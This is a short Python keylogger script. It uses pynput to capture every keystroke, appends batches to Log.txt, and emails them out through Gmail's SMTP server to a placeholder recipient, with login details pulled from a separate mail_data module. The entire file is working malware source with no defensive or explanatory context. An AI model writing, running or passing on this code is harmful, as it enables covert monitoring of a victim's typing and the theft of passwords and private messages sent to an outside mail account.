#Library
import pynput
from pynput.keyboard import Key, Listener
import smtplib, ssl
import mail_data

count = 0
keys = []

def on_press(key):
    print(key)
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        save_key(keys)
        keys = []

def save_key(keys):
	message = ""
	for key in keys:
		k = key.replace("'","")
		if key == "Key.space":
			k = " "
		if key == "Key.enter":
			k = "\n"
		if key == "Key.ctrl_l":
			k = "\n"
		if key == "Key.alt_l":
			k = "\n"
		if key == "Key.tab":
			k = "\n" 
		if key.find("Key")>0:
			k = ""
		message += k
	with open("Log.txt", "a") as file:
		file.write(message)
	print(message)
	sendEmail(message)

def sendEmail(message):
	smtp_server = "smtp.gmail.com"
	port = 587 
	sender_email = mail_data.send_email
	password = mail_data.pss
	receiver_email = "Your Email"

	context = ssl.create_default_context()

	try:
	    server = smtplib.SMTP(smtp_server,port)
	    server.ehlo() 
	    server.starttls(context=context) 
	    server.ehlo()
	    server.login(sender_email, password)
	    server.sendmail(sender_email, receiver_email, message)
	   
	except Exception as e:
	    print(e)
	finally:
	    server.quit()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
